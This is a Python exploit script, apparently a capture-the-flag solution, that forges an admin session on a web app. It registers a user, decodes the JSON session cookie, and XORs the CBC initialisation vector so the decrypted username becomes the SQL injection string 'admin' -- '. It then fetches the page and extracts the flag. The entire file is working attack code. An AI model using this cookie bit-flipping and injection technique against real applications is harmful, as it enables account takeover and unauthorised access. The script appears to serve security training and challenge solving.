import requests
import os
import base64
import json
from Crypto.Util.Padding import pad
from pwn import xor
import re

HOST=os.getenv('HOST')
PORT=os.getenv('PORT')
BASE=f"http://{HOST}:{PORT}"
if not HOST or not PORT:
    print("Missing host or port")
    exit()

with requests.session() as s:
    username = "abcd"
    password = "abcd"
    resp = s.post(f"{BASE}/register", data={"name": username, "password": password}, headers={"Content-Type" : "application/x-www-form-urlencoded"})
    resp = s.post(f"{BASE}/login", data={"name": username, "password": password}, headers={"Content-Type" : "application/x-www-form-urlencoded"})
    
    session = s.cookies.get("session")    
    session = base64.urlsafe_b64decode(session)
    session = json.loads(session)

    iv = bytes.fromhex(session["iv"])
    newiv = xor(iv, pad(b"admin' -- ", 16))
    newiv = xor(newiv, pad(username.encode(), 16))
    session["iv"] = newiv.hex()

    session = json.dumps(session)
    session = base64.urlsafe_b64encode(session.encode()).decode()
    s.cookies.clear()
    s.cookies.set("session", session)

    resp = s.get(f"{BASE}/")
    print(re.findall("flag\{.*?\}", resp.text, re.UNICODE)[0])